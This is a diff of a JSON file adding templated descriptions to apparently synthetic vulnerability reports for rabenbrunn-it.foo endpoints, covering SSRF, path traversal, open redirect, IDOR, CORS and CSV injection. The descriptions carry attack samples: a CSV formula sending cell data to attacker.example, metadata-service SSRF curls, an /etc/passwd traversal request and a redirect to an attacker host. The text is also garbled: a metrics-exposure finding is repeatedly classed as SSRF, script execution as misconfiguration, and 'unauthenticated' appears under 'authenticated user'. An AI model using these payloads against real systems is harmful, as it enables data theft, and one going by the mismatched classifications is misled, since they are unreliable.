+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.rabenbrunn-it.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -720,7 +725,8 @@
           "offset": "1d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -875,7 +881,8 @@
           "offset": "2d 15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rabenbrunn-it.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -995,7 +1002,8 @@
           "offset": "5d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1130,7 +1138,8 @@
           "offset": "5d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rabenbrunn-it.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1229,7 +1238,8 @@
           "offset": "3d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1341,7 +1351,8 @@
           "offset": "10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1469,7 +1480,8 @@
           "offset": "5d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rabenbrunn-it.foo/import`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1593,7 +1605,8 @@
           "offset": "5d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.rabenbrunn-it.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1729,7 +1742,8 @@
           "offset": "7d 6h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1869,7 +1883,8 @@
           "offset": "6d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.rabenbrunn-it.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1996,7 +2011,8 @@
           "offset": "5d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2144,7 +2160,8 @@
           "offset": "6d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.rabenbrunn-it.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2259,7 +2276,8 @@
           "offset": "1d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rabenbrunn-it.foo/import`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2387,7 +2405,8 @@
           "offset": "4d 20h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.rabenbrunn-it.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2515,7 +2534,8 @@
           "offset": "3d 17h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.rabenbrunn-it.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2613,7 +2633,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2713,7 +2734,8 @@
           "offset": "1d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2808,7 +2830,8 @@
           "offset": "14h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rabenbrunn-it.foo/export`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2968,7 +2991,8 @@
           "offset": "1d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.rabenbrunn-it.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3107,7 +3131,8 @@
           "offset": "9d",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3192,7 +3217,8 @@
           "offset": "1d 8h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3320,7 +3346,8 @@
           "offset": "7d 16h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3464,7 +3491,8 @@
           "offset": "6d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3627,7 +3655,8 @@
           "offset": "4d 12h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rabenbrunn-it.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3706,7 +3735,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rabenbrunn-it.foo/profile`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3833,7 +3863,8 @@
           "offset": "2d 16h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rabenbrunn-it.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3981,7 +4012,8 @@
           "offset": "5d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4093,7 +4125,8 @@
           "offset": "5h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4236,7 +4269,8 @@
           "offset": "5d 3h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4368,7 +4402,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rabenbrunn-it.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4538,7 +4573,8 @@
           "offset": "6d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
